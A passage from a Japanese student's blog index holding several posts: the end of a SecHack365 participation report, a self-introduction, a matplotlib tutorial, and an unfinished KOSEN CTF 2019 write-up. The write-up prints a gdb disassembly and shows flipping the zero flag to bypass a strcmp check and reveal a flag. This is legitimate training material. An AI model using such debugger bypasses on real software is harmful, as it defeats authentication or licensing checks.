本当に沖縄回のレポートのサムネになりました。\n最終発表は福岡回と同様に他の人の発表も全員分聞けます。（全員分やるので2日に分けてやります）\nすごい発表ばかりで度肝を抜かれました。あんなにすごい発表を一度に聞けるなんて本当に貴重な機会だったと思います。\n成果発表会では優秀修了生の発表しか聞けないので全員分の壇上での発表を聞けるのはトレーニーの特権ですね。\n事前に何度も発表練習を聞いている同じ思索駆動の仲間の発表でも壇上だと全然違ったりして新鮮でした。（みんな本当にすごかった）\n全員の発表が終わるとみんなお疲れ様ムードに。\n温泉に浸かったりLTをやったり色々楽しめました。\n年が近いやつら組でアニメの上映会もやりました。（こういうのがやりたかったのです！僕は）\n全員（というか約二名）恋アスの圧倒的 Power に敗北していて面白かったです。6\nこういう機会はなかなか無かったのですっごい楽しかったです。（小学生以下の感想）\nあと、僕と同じ雑誌を購読している子がいて地味にびっくりしました。\n三日目は優秀修了生の発表だったのですが、どうしても決まらなかったらしく数日後におあずけに。\nできれば直接優秀修了生におめでとうを言いたかったところですが、まさか決まらないほど審査が難航するとは\u0026hellip;\nそれほど接戦だったのでしょうか\u0026hellip;？\nなので急遽竹迫さんのLTに。全部聞きたかったのですが昨日色々うろうろしているうちにリュックサックを丸々紛失したので仕方なくそれを探す旅に。\n衣服以外のすべてがそこに入っていたので内心結構焦っていたのですが、トレーナー控室に預けられていて無事見つかりました。\nありました\nお騒がせしました https://t.co/tH9qo6CHgB\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) February 2, 2020  コースワークでは区切りの挨拶。\nいつもの通り半円になって一人ずつ挨拶をしました。\nみんなの前に経つと何故か安心感があってこの一年間で実際には六度ほどしか会ってないのにすごくなつかしい顔ぶれに見えて不思議な気分になりました。\nあぁこれで終わりなのかな\u0026hellip;となんだか寂しい気分に。\nその後は北海道回でもデータセンターにお邪魔したさくらインターネットの田中社長の公演がありました。\nスライドもお話も面白くてためになりました。（聞いててすっかり引き込まれた）\nみんな終わった後、田中社長やトレーナーにサインを頂いてました。\n最後は全員で沖縄の聖地斎場御嶽に。\n途中で海の前で集合写真を撮ったのですがすごい綺麗でした。\n  こんなにきれいな海を見たのは初めてかも知れません。\n道中にシーサーが置かれていたり自販機がローカル感満載だったりして沖縄に来たんだなぁと思いました。（ずっと会場にいたので尚更）\n 見学の後もマンゴーアイスを食べたりサトウキビジュースを飲んだり短いながらも沖縄を満喫しました。\n空港に着いてからもA\u0026amp;Wに行ったり楽しめました。（そういう意味でも一年で成長した気がする）\n帰りは飛行機がまさかの遅延して帰りが0時をすぎるというハプニングもありましたが無事家にたどり着きました。\n帰宅\n今日のことは一生忘れないと思う#SecHack365\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) February 2, 2020  本当に楽しくて夢のような三日感でした。\n終わった後本当に寂しかったです。\n成果発表会（秋葉原回） さぁ成果発表会です！！！と言いたいところだったのですが2019年度の成果発表会は開催延期となってしまいました\u0026hellip;\n SecHack365 成果発表会 開催延期について\n3月6日（金）に開催予定でしたSecHack365成果発表会は、新型コロナウイルスの感染拡大防止の観点から開催を延期することを決定いたしました。開催時期につきましては改めて本Webサイトでご案内いたします。また、当日公開予定でした作品等につきましてはWebサイトで公開する予定です。\nご参加を予定されていた方には大変申し訳ありませんが、何卒ご理解をいただきますようお願い申し上げます。\nhttps://sechack365.nict.go.jp/presentation.html\n 残念ですが、中止ではなく延期なのでそれまでにしっかり準備して行きたいと思います。\n1年間参加した感想 さて1年間SecHack365に参加した感想ですが、なにより参加して本当に良かったなと思いました。これが第一です。\n1年間という長い期間、あのような素晴らしい環境で開発したり一つのことについて考えるというのはなかなかできない貴重な体験だったと思います。\n今までそこまで長い期間一つのものを開発したことが無かったですし、思索を巡らせて自らが提起した問題について真摯に考えるということもなかったと思います。\nポスターやスライドもこれほど丁寧に添削されることも初めての経験でした。\n予算面やトレーナーさんのバックアップにも恵まれていて本当に充実した環境だったなと感じました。\nそんな恵まれた環境で開発を進めることができたのは今後の人生にも大きく役立つ素晴らしい経験だったと思います。\n本当に感謝してもしきれないです。\nまた、すごい実力を持ったトレーナーやトレーニーと一緒に全国をまわったり対話したり、発表を聞きあったりしたのもすごくいい刺激でした。\n本当にこんなすごい人っているんだなぁとこの目で確かめられただけじゃなくて一緒に過ごすことでその人の内面とかまで知れたのが良かったです。\n多分SecHackがなければ一生出会うことが無かっただろうなというような仲間と出会えたのは本当に嬉しいことでした。\nそんな仲間たちとまた違う場で強くなって再会するのが僕の密かな目標です。（待ってろよ）\n思索駆動コースだったからこそ得られたことも多かったです。\n誰かと対話していく中で自分の提起した問題について考えを深めていったりペルソナを設定してそこに向けて機能や仕様を考えてみたり考えながら開発していくというのはとにかく新鮮でした。\nいつも一度開発に入ってしまうと技術的なことばっかり頭にあって突っ走ってしまうことが多かったのですが最後まで思索の連続で学ぶことが多かったです。\n思索ってひとりで悶々と考えているイメージがあったので他者との対話によってどんどん考えが膨らむのは衝撃的でした。\n良い思索はいい仲間からなのかも知れません。そういう意味で思索駆動コースの仲間には感謝してもしきれないです。\nオンラインゼミもニュースを取り上げて自分の感想を述べたり発表練習をしたり楽しかったです。\n言葉の意味とか表現の細かい部分にまで気を配るようになりました。神は細部に宿る。\nあと、習慣化が僕のSecHackので活動を支える重要な要素だったなと感じます。\n神奈川回を振り返ったあとでちょっと触れた、「一週間ごとにやったこととか思索をまとめたスライドを出す」という思いつきですが、今でも続いています。\n2019年5月19日の週から始まったこのスライドですが、2020年4月12日までの週まで（計47+1回！）一度も途切れずに続けることができました。\n本当は成果発表会のある3月8日までの週で終わらせようと思っていたのですが発表会が延期したので今でも続いています。（成果発表会までは続けるつもり）\nこのスライドを中心にSecHackでの活動をしていました。1年間という長い期間を戦いぬけたのはこのスライドのおかげです。\n目標の細分化と習慣化による効果を知れた（そして実践できた）のは大きいなぁと思います。\nまとめスライドを作ったのがあるのでここで公開したいと思います。（3月末に書いた）\n 一年間やってみての感想とか振り返りとやってみて感じた習慣化の意義とかが書かれています。\nよかったら見てみてください。\nこの1年でたくさんのことを見て、体験して、学びました。\nそのどれもが刺激的でおそらくSecHackでしか味わえない体験だったと思います。\nこれらの貴重な体験を大切にしてこれからも精進していきたいと思います。きっと今後の人生に大きく役立ってくれることでしょう。\nSecHackで過ごしたこの1年間は僕の一生の思い出です。\n参加を考えている人に向けて この記事をここまで読んだなら今頃事務局に参加希望の問い合わせが殺到している頃でしょう。（多分）\nもしこの記事を読んで少しでもいいなと思ったら是非とも参加を検討してみてください。\n特にオススメしたい人はプログラムを書いたりものづくりをしたりするのがすっごい好きな人ですかね。SecHackはなんだかんだそういう人の集まりな気がします。\nよくあるのは自分では実力不足なのでは？と心配になってしまい参加を見送ってしまう人です。\n僕は否定しません。というのもSecHack365は人生で一度しか参加できないのです。\nなのである程度の実力を備えてから参加するというのもアリだと僕は思います。\nしかし、とりあえず応募してみるというのも悪い選択肢ではないことを書いておきます。\n応募課題を出すだけでもいい練習になりますし、詰まるような部分があればそこが自分の足りないところだと分かります。\nしかもSecHackは1年間という長い期間で開催されます。努力次第では追いつける部分もあると思いますしどっちにせよ勉強しながら開発する形になっていくと思います。（なるようになる（多分））\nそして何よりトレーニー同士のつながりは大きいです。\nSecHackに参加するトレーニーはすごい人ばっかりです。そういう人たちと交流して間近で影響を受けるのはとっても大きいことだと思います。\n仲良くなるなら早いほうが良いでしょう。\nそういう意味でも、もったいぶらずにじゃんじゃん応募してみる方が良いと思います。\n受かるかどうかは応募すれば分かります（当然）\nあとこれは受かった後の話ですが、飛行機での移動が多くなるので出発する前に保安検査に引っかかりそうなものは予め荷物から出しておきましょう。（4敗）\nvs保安検査 （1勝3敗1分）\n神奈川 : 引き分け（対戦なし）\n北海道 : 負け（はさみ）\n福岡 : 勝ち\n宮城 : 負け（カッター,はさみ,ナイフ）【スペシャルゲスト:ポリスメン】\n愛媛 : 負け（はさみ,千枚通し,半田ごて）\n沖縄 : ？？？\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) January 30, 2020  （沖縄では保安検査に打ち勝ちましたが行きの飛行機に乗り遅れたので敗北）\nそして、この記事を書いてる間にSecHackのHPが2020年度仕様に変更されていました！\nそこには応募を考えている人向けの話とかコースの説明とかがたくさん乗っているので応募を考えている人は是非ともこちらを読んで準備を進めてみてはいかかがでしょうか？\n去年よりも応募者向けの情報がしっかりしてる\u0026hellip;（特に各コースの説明が充実しているのでぜひ読んでみてください）\n終わりに 思い出に浸っていたら結構な量になってしまいました\u0026hellip;（書くのに5日くらいかかった）\n一年間の振り返りを書きながら「あぁ\u0026hellip;こんなこともあったなぁ\u0026hellip;」と懐かしい気持ちになりました。\nこの参加録が次の応募者の参考になったら良いなぁと思います。\n最後に一年間お世話になったトレーナー、トレーニーのみんなそして事務局の方に感謝申し上げます。\n本当に楽しかったです。ありがとうございます。\nそして、我々3期生にはまだ成果発表会が残っています。7\n僕らのSecHack365はまだ終わらないのです。これからも頑張ります！\n同期のみんなは成果発表会で会いましょう。\nそれではさようなら。\n マジで憶えてない\u0026hellip;コース選択した記憶があんまりないから幻なのかもしれない\u0026hellip; \u0026#x21a9;\u0026#xfe0e;\n ただし記憶力皆無なので誰だか覚えていません。（は？） \u0026#x21a9;\u0026#xfe0e;\n よかったね。（すっとぼけ） \u0026#x21a9;\u0026#xfe0e;\n 増田検事お元気かしら \u0026#x21a9;\u0026#xfe0e;\n そうわね。 \u0026#x21a9;\u0026#xfe0e;\n なんでお前他人事なの？ \u0026#x21a9;\u0026#xfe0e;\n 通称SecHack500 \u0026#x21a9;\u0026#xfe0e;\n   ","description":"SecHack365 '19の参加録","id":12,"section":"posts","tags":["参加録","SecHack365"],"title":"SecHack365 '19 参加録","uri":"https://takana-norimasa.github.io/blog/posts/sechack365/"},{"content":"SecHack365の興奮冷めやらぬ2020年4月の頭．\nそう言えば，参加録とか書いたこと無いな…と思った．\nそして，それを書く場が無いな…とも思った．\n技術的なことはQiitaに書いていたし，趣味の技術活動とか漫画の感想とかについては別でサイトを持ってる．\n\u0026hellip;この際だし，せっかくだからブログを作っちゃおう．\nそんなことをふと思いポートフォリオの建設作業をほっぽり出して，慣れているhugo + github pagesでササッと作りはじめた．\n自己紹介 高名って言います．\nハンドルネーム的なやつはありません．あんま好きじゃないので．\nどこぞの教育機関の学生で自分の専門を求めて色んな分野に手を出している人間です．\n最近は低レイヤ方面に興味を持ち始めました．（漫然）\nName: Takana Norimasa\nAge: 19\nNationality: Japan\nTwitter: @303_See_0ther\nGithub: Takana-Norimasa\nMail: neuromancer_wg@outlook.jp\nまぁ詳しくはポートフォリオを読んでください．\n上のabout meからいつでも飛べます．\nまだ建設中なので何もわからないです．はい．\n完成しました．(2020 04/22)\n今度こそ上のabout meからいつでも見られます．\n今までの活動 せっかくなので今までの様々な活動を振り返ってみました．\nただ参加した程度のものから受賞にまでこぎつけたものまで様々です．\nこんな感じです．\n2017年    date events     8/8, 9 情報セキュリティ大学院大学　Basic SecCap　先進演習科目　受講   8/30, 31 K-SEC 情報セキュリティ高度人材　夏休み合宿講座　参加   10/20, 21 KOSEN セキュリティコンテスト 2017　参加   10/23,24 MWSCUP2017　参加    2018年    date events     1/15-1/17 トレンドマイクロ　ガーディアンプロジェクト　参加   2/10,11 チームラボハッカソン　参加   2/17 LoRaWAN™を使った 柏の葉IoTハッカソン アイデア賞　受賞   9/1,2 KOSEN セキュリティコンテスト 2018　参加   9/10 富士通　特別体験演習（CYBERIUM）参加   10/17 第４回千葉県警生活安全部長杯争奪CTF大会　参加（4位）   10/21-23 MWSCUP2018　参加   10/27 SECCON予選　参加   12/8 K-SEC 和歌山大セキュリティ演習　参加    2019年    date events     4/30-5/1 令和CTF　参加   5/17- SecHack365参加   10/13,14 全国高等専門学校プログラミングコンテスト本戦出場（競技部門）   10/26 KOSEN セキュリティコンテスト 2019　参加    こんなかんじですかね．\n思い出したらまた書きます．（多分何個も抜けてる）\n運営方針 基本的には参加したイベントとかの参加録を載せていく感じになると思います．\nQiitaが迷走し始めているし，技術記事もゆくゆくはここに書くことになるかもしれないです．\nここにいっぱい記事が書けるようにがんばります\u0026hellip;\n（SecHackの参加録を出すために大慌てで工事をしたのでまだ未完成の部分が多い\u0026hellip;さっさと完成させなきゃ\u0026hellip;）\n","description":"自己紹介的なアレ．","id":13,"section":"posts","tags":["日記"],"title":"開設の経緯とか","uri":"https://takana-norimasa.github.io/blog/posts/hello/"},{"content":" この記事はmatplotlibで特定のデータにだけマーカーを適用する方法 - Qiitaから移転してきたものです．\n はじめに 雑誌の掲載順をグラフ化するときに，matplotlibで特定の項目にだけマーカー（グラフに打つ点）をつけたくなった（センターカラーのときにだけわかりやすいように目印をつけたかった）が，探しても全く出てこなかったのでメモ．\n↑こんな感じで強調するために特定の値の時だけマーカーを適用したかった．\n環境 $ uname -a Linux kali 4.18.0-kali2-amd64 #1 SMP Debian 4.18.10-2kali1 (2018-10-09) x86_64 GNU/Linux $ python3 --version Python 3.7.6 $ pip3 show matplotlib Name: matplotlib Version: 3.1.2 問題 例えば，以下のようなデータがあったとする．\n   month 1月 2月 3月 4月 5月 6月 7月 8月 9月 10月 11月 12月      data 13 15 21 5 10 18 21 17 15 16 21 13     これらをグラフにするとこうなる．\nこのグラフの1,4,7,10月のデータにだけダイヤモンドでマーカーを付けたい（その他には付けたくない）ときどうすればいいだろうか．\n解決法 マーカーを付けたい部分だけを配列にしてプロットするときにmarkevery=で渡す．\nX番目にマーカーを付けたければX-1番目の数を配列に追加する．\nこんな感じ．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #!/usr/bin/env python  import matplotlib.pyplot as plt X_data=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12] Y_data=[13,15,21,5,10,18,21,17,15,16,21,13] month_name=[\u0026#39;Jan.\u0026#39;,\u0026#39;Feb.\u0026#39;,\u0026#39;Mar.\u0026#39;,\u0026#39;Apr.\u0026#39;,\u0026#39;May\u0026#39;,\u0026#39;Jun.\u0026#39;,\u0026#39;Jul.\u0026#39;,\u0026#39;Aug.\u0026#39;,\u0026#39;Sep.\u0026#39;,\u0026#39;Oct.\u0026#39;,\u0026#39;Nov.\u0026#39;,\u0026#39;Dec.\u0026#39;] mark_point=[0,3,6,9] plt.xlabel(\u0026#39;month\u0026#39;) plt.ylabel(\u0026#39;data\u0026#39;) plt.grid(color=\u0026#39;gray\u0026#39;) plt.xticks(X_data,month_name) plt.yticks(range(1,max(Y_data)+1)) plt.plot(X_data,Y_data, \u0026#39;.\u0026#39;, linestyle=\u0026#39;solid\u0026#39;, marker=\u0026#34;D\u0026#34;, markevery=mark_point) plt.show()    結果\n y軸のデータを基準にしたければ，先にデータを比較して配列に格納すれば良い．\n例）データが奇数のときだけマーカーを適応する．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  #!/usr/bin/env python  import matplotlib.pyplot as plt X_data=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12] Y_data=[13,15,21,5,10,18,21,17,15,16,21,13] month_name=[\u0026#39;Jan.\u0026#39;,\u0026#39;Feb.\u0026#39;,\u0026#39;Mar.\u0026#39;,\u0026#39;Apr.\u0026#39;,\u0026#39;May\u0026#39;,\u0026#39;Jun.\u0026#39;,\u0026#39;Jul.\u0026#39;,\u0026#39;Aug.\u0026#39;,\u0026#39;Sep.\u0026#39;,\u0026#39;Oct.\u0026#39;,\u0026#39;Nov.\u0026#39;,\u0026#39;Dec.\u0026#39;] mark_point=[] for i,data in enumerate(Y_data): if data%2: mark_point.append(i) plt.xlabel(\u0026#39;month\u0026#39;) plt.ylabel(\u0026#39;data\u0026#39;) plt.grid(color=\u0026#39;gray\u0026#39;) plt.xticks(X_data,month_name) plt.yticks(range(1,max(Y_data)+1)) plt.plot(X_data,Y_data, \u0026#39;.\u0026#39;, linestyle=\u0026#39;solid\u0026#39;, marker=\u0026#34;D\u0026#34;, markevery=mark_point) plt.show()    結果\n 一件落着．\n参考文献 Markevery Demo — Matplotlib 3.1.2 documentation\n","description":"matplotlibで特定の項目にだけマーカーをつける方法","id":14,"section":"posts","tags":["Python","matplotlib"],"title":"matplotlibで特定のデータにだけマーカーを適用する方法","uri":"https://takana-norimasa.github.io/blog/posts/mplib_marker/"},{"content":" この記事はKOSENセキュリティコンテスト2019 Writeup - Qiitaから移転してきたものです．\n はじめに 10/26に開催されたKOSENセキュリティコンテスト2019に出場してきた．今年で3回目．\n今年は例年と違って1日のみの6時間と大幅短い時間での開催になった．\n結果は1160点で16位．もう少し頑張れた気もするけど，まぁこれが今の実力かなぁとも思った．\nもっと精進せねば\u0026hellip;\nWriteup 問題が即削除されたのでかなり曖昧です\u0026hellip;\n運営さんはあれだけWriteupを書くことを推奨していたんだから問題を残しておいて（切実\nとりあえず，.zsh_historyと記憶を頼りに解いた順に書いてく．\n09 プログラミング言語を当てよう 早速，詰まった．いろいろ試したがヒットしないし，その割りに解答率がいいので話題のアレかとなった．（確か，returnを使った特徴的な記法で気がついた気がする．）\nfunction inc(num) num = num + 1 return num class ClassName(name) @name = name @function output() print(\u0026quot;Hello, \u0026quot;) print(self.name) return この言語の名前はBlawnなので問題文の通り（確かそう），大文字で\nCTFKIT{BLAWN} 17 目に見えなくても 問題に書いてあるリンクを踏むと何もかかれていないページが．\nページのソースを見るとflagが書いてある．\nCTFKIT{html_may_be_including_hidden_text} 12 大人たちの無意味な慣習 pcap問題．\nとりあえずhtmlとcssとzipがあったのでエクスポート．\n適当にhtmlを眺めてみると，\nなんてこったい．\nさっきエクスポートしたzipファイルにこのパスワードを突っ込んで解凍すると，\nCTFKIT{majide_muimina_shuukan_dayonee} ##06 無言のELF\nバイナリ問題．\n実行すると無言で文字列の受付けをする．手がかりはなし．\ngdb-pedaに投げる．\nアセンブラ全文 gdb-peda$ pdisass Dump of assembler code for function main: 0x000055555555480a \u0026lt;+0\u0026gt;:\tpush rbp 0x000055555555480b \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000055555555480e \u0026lt;+4\u0026gt;:\tpush r15 0x0000555555554810 \u0026lt;+6\u0026gt;:\tpush r14 0x0000555555554812 \u0026lt;+8\u0026gt;:\tpush r13 0x0000555555554814 \u0026lt;+10\u0026gt;:\tpush r12 0x0000555555554816 \u0026lt;+12\u0026gt;:\tpush rbx 0x0000555555554817 \u0026lt;+13\u0026gt;:\tsub rsp,0x168 0x000055555555481e \u0026lt;+20\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x0000555555554827 \u0026lt;+29\u0026gt;:\tmov QWORD PTR [rbp-0x38],rax 0x000055555555482b \u0026lt;+33\u0026gt;:\txor eax,eax 0x000055555555482d \u0026lt;+35\u0026gt;:\tmovabs rax,0x676665646362615f 0x0000555555554837 \u0026lt;+45\u0026gt;:\tmovabs rdx,0x6f6e6d6c6b6a6968 0x0000555555554841 \u0026lt;+55\u0026gt;:\tmov QWORD PTR [rbp-0x170],rax 0x0000555555554848 \u0026lt;+62\u0026gt;:\tmov QWORD PTR [rbp-0x168],rdx 0x000055555555484f \u0026lt;+69\u0026gt;:\tmovabs rax,0x7776757473727170 0x0000555555554859 \u0026lt;+79\u0026gt;:\tmovabs rdx,0x34333231307a7978 0x0000555555554863 \u0026lt;+89\u0026gt;:\tmov QWORD PTR [rbp-0x160],rax 0x000055555555486a \u0026lt;+96\u0026gt;:\tmov QWORD PTR [rbp-0x158],rdx 0x0000555555554871 \u0026lt;+103\u0026gt;:\tmov DWORD PTR [rbp-0x150],0x38373635 0x000055555555487b \u0026lt;+113\u0026gt;:\tmov WORD PTR [rbp-0x14c],0x39 0x0000555555554884 \u0026lt;+122\u0026gt;:\tmov rdx,QWORD PTR [rip+0x200785] # 0x555555755010 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x000055555555488b \u0026lt;+129\u0026gt;:\tlea rax,[rbp-0x140] 0x0000555555554892 \u0026lt;+136\u0026gt;:\tmov esi,0x100 0x0000555555554897 \u0026lt;+141\u0026gt;:\tmov rdi,rax 0x000055555555489a \u0026lt;+144\u0026gt;:\tcall 0x5555555546c0 \u0026lt;fgets@plt\u0026gt; 0x000055555555489f \u0026lt;+149\u0026gt;:\tlea rax,[rbp-0x140] 0x00005555555548a6 \u0026lt;+156\u0026gt;:\tlea rsi,[rip+0x22b] # 0x555555554ad8 0x00005555555548ad \u0026lt;+163\u0026gt;:\tmov rdi,rax 0x00005555555548b0 \u0026lt;+166\u0026gt;:\tcall 0x5555555546e0 \u0026lt;strtok@plt\u0026gt; 0x00005555555548b5 \u0026lt;+171\u0026gt;:\tlea rax,[rbp-0x140] 0x00005555555548bc \u0026lt;+178\u0026gt;:\tlea rsi,[rip+0x217] # 0x555555554ada 0x00005555555548c3 \u0026lt;+185\u0026gt;:\tmov rdi,rax 0x00005555555548c6 \u0026lt;+188\u0026gt;:\tcall 0x5555555546d0 \u0026lt;strcmp@plt\u0026gt; 0x00005555555548cb \u0026lt;+193\u0026gt;:\ttest eax,eax 0x00005555555548cd \u0026lt;+195\u0026gt;:\tjne 0x555555554a0e \u0026lt;main+516\u0026gt; 0x00005555555548d3 \u0026lt;+201\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x161] 0x00005555555548da \u0026lt;+208\u0026gt;:\tmovsx esi,al 0x00005555555548dd \u0026lt;+211\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x150] 0x00005555555548e4 \u0026lt;+218\u0026gt;:\tmovsx edi,al 0x00005555555548e7 \u0026lt;+221\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x15c] 0x00005555555548ee \u0026lt;+228\u0026gt;:\tmovsx r8d,al 0x00005555555548f2 \u0026lt;+232\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x16b] 0x00005555555548f9 \u0026lt;+239\u0026gt;:\tmovsx r9d,al 0x00005555555548fd \u0026lt;+243\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x168] 0x0000555555554904 \u0026lt;+250\u0026gt;:\tmovsx eax,al 0x0000555555554907 \u0026lt;+253\u0026gt;:\tmov DWORD PTR [rbp-0x174],eax 0x000055555555490d \u0026lt;+259\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x160] 0x0000555555554914 \u0026lt;+266\u0026gt;:\tmovsx ebx,al 0x0000555555554917 \u0026lt;+269\u0026gt;:\tmov DWORD PTR [rbp-0x178],ebx 0x000055555555491d \u0026lt;+275\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x152] 0x0000555555554924 \u0026lt;+282\u0026gt;:\tmovsx ecx,al 0x0000555555554927 \u0026lt;+285\u0026gt;:\tmov DWORD PTR [rbp-0x17c],ecx 0x000055555555492d \u0026lt;+291\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x15c] 0x0000555555554934 \u0026lt;+298\u0026gt;:\tmovsx edx,al 0x0000555555554937 \u0026lt;+301\u0026gt;:\tmov DWORD PTR [rbp-0x180],edx 0x000055555555493d \u0026lt;+307\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x16b] 0x0000555555554944 \u0026lt;+314\u0026gt;:\tmovsx r15d,al 0x0000555555554948 \u0026lt;+318\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x170] 0x000055555555494f \u0026lt;+325\u0026gt;:\tmovsx r14d,al 0x0000555555554953 \u0026lt;+329\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x15e] 0x000055555555495a \u0026lt;+336\u0026gt;:\tmovsx r13d,al 0x000055555555495e \u0026lt;+340\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x16e] 0x0000555555554965 \u0026lt;+347\u0026gt;:\tmovsx r12d,al 0x0000555555554969 \u0026lt;+351\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x168] 0x0000555555554970 \u0026lt;+358\u0026gt;:\tmovsx ebx,al 0x0000555555554973 \u0026lt;+361\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x160] 0x000055555555497a \u0026lt;+368\u0026gt;:\tmovsx r11d,al 0x000055555555497e \u0026lt;+372\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x167] 0x0000555555554985 \u0026lt;+379\u0026gt;:\tmovsx r10d,al 0x0000555555554989 \u0026lt;+383\u0026gt;:\tmov DWORD PTR [rbp-0x184],r10d 0x0000555555554990 \u0026lt;+390\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x150] 0x0000555555554997 \u0026lt;+397\u0026gt;:\tmovsx r10d,al 0x000055555555499b \u0026lt;+401\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x16e] 0x00005555555549a2 \u0026lt;+408\u0026gt;:\tmovsx ecx,al 0x00005555555549a5 \u0026lt;+411\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x160] 0x00005555555549ac \u0026lt;+418\u0026gt;:\tmovsx edx,al 0x00005555555549af \u0026lt;+421\u0026gt;:\tmovzx eax,BYTE PTR [rbp-0x168] 0x00005555555549b6 \u0026lt;+428\u0026gt;:\tmovsx eax,al 0x00005555555549b9 \u0026lt;+431\u0026gt;:\tpush rsi 0x00005555555549ba \u0026lt;+432\u0026gt;:\tpush rdi 0x00005555555549bb \u0026lt;+433\u0026gt;:\tpush r8 0x00005555555549bd \u0026lt;+435\u0026gt;:\tpush r9 0x00005555555549bf \u0026lt;+437\u0026gt;:\tmov esi,DWORD PTR [rbp-0x174] 0x00005555555549c5 \u0026lt;+443\u0026gt;:\tpush rsi 0x00005555555549c6 \u0026lt;+444\u0026gt;:\tmov edi,DWORD PTR [rbp-0x178] 0x00005555555549cc \u0026lt;+450\u0026gt;:\tpush rdi 0x00005555555549cd \u0026lt;+451\u0026gt;:\tmov esi,DWORD PTR [rbp-0x17c] 0x00005555555549d3 \u0026lt;+457\u0026gt;:\tpush rsi 0x00005555555549d4 \u0026lt;+458\u0026gt;:\tmov edi,DWORD PTR [rbp-0x180] 0x00005555555549da \u0026lt;+464\u0026gt;:\tpush rdi 0x00005555555549db \u0026lt;+465\u0026gt;:\tpush r15 0x00005555555549dd \u0026lt;+467\u0026gt;:\tpush r14 0x00005555555549df \u0026lt;+469\u0026gt;:\tpush r13 0x00005555555549e1 \u0026lt;+471\u0026gt;:\tpush r12 0x00005555555549e3 \u0026lt;+473\u0026gt;:\tpush rbx 0x00005555555549e4 \u0026lt;+474\u0026gt;:\tpush r11 0x00005555555549e6 \u0026lt;+476\u0026gt;:\tmov r9d,DWORD PTR [rbp-0x184] 0x00005555555549ed \u0026lt;+483\u0026gt;:\tmov r8d,r10d 0x00005555555549f0 \u0026lt;+486\u0026gt;:\tmov esi,eax 0x00005555555549f2 \u0026lt;+488\u0026gt;:\tlea rdi,[rip+0xff] # 0x555555554af8 0x00005555555549f9 \u0026lt;+495\u0026gt;:\tmov eax,0x0 0x00005555555549fe \u0026lt;+500\u0026gt;:\tcall 0x5555555546b0 \u0026lt;printf@plt\u0026gt; =\u0026gt; 0x0000555555554a03 \u0026lt;+505\u0026gt;:\tadd rsp,0x70 0x0000555555554a07 \u0026lt;+509\u0026gt;:\tmov eax,0x0 0x0000555555554a0c \u0026lt;+514\u0026gt;:\tjmp 0x555555554a1f \u0026lt;main+533\u0026gt; 0x0000555555554a0e \u0026lt;+516\u0026gt;:\tlea rdi,[rip+0x113] # 0x555555554b28 0x0000555555554a15 \u0026lt;+523\u0026gt;:\tcall 0x555555554690 \u0026lt;puts@plt\u0026gt; 0x0000555555554a1a \u0026lt;+528\u0026gt;:\tmov eax,0x1 0x0000555555554a1f \u0026lt;+533\u0026gt;:\tmov rbx,QWORD PTR [rbp-0x38] 0x0000555555554a23 \u0026lt;+537\u0026gt;:\txor rbx,QWORD PTR fs:0x28 0x0000555555554a2c \u0026lt;+546\u0026gt;:\tje 0x555555554a33 \u0026lt;main+553\u0026gt; 0x0000555555554a2e \u0026lt;+548\u0026gt;:\tcall 0x5555555546a0 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x0000555555554a33 \u0026lt;+553\u0026gt;:\tlea rsp,[rbp-0x28] 0x0000555555554a37 \u0026lt;+557\u0026gt;:\tpop rbx 0x0000555555554a38 \u0026lt;+558\u0026gt;:\tpop r12 0x0000555555554a3a \u0026lt;+560\u0026gt;:\tpop r13 0x0000555555554a3c \u0026lt;+562\u0026gt;:\tpop r14 0x0000555555554a3e \u0026lt;+564\u0026gt;:\tpop r15 0x0000555555554a40 \u0026lt;+566\u0026gt;:\tpop rbp 0x0000555555554a41 \u0026lt;+567\u0026gt;:\tret End of assembler dump.  とりあえず動かして流れを読む． gdb-peda$ start 適当にnextを押していたら終わってしまった．\nしかし，途中でstrcompとjneの分岐があった．非常に怪しい．\nここをうまく分岐の中に入れればいい感じなんじゃないか？\nそこでjne命令のところでflag（レジスタの方）を書き換える．\ngdb-peda$ info registers eflags eflags 0x282 [ SF IF ] gdb-peda$ set $eflags ^= (1 \u0026lt;\u0026lt; 6) gdb-peda$ info registers eflags eflags 0x2c2 [ ZF SF IF ] ゼロフラグを書き換えた．これでジャンプしないはず．\nジャンプしないまま続けるとレジスタにそれっぽい文字列が出てき始める．\nしばらくまたnextで進めていくとprintfにぶつかりflagが出力される．\nCTFKIT{hpb5iphbr_et3phet5o} gdbだと出力がすぐに次に行っちゃって分かり辛いので注意．\n02 伝統的な暗号 確かキーの長さが三文字と問題文に書いてあった．\n換字式暗号であることは間違いないが，3文字って何\u0026hellip;?\n結構時間がかかった問題．\n与えられた文字列：UAPCPD{vv_e_cuyo_csylxwyo_upzzlb?}\nとりあえず，CTFKITの文字は確定してるのでCとU，TとA，FとP\u0026hellip;と六文字の文字の距離を測ってみる．\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  def dist(y,x): counter=0 x=ord(x.lower()) y=ord(y.lower()) while(True): 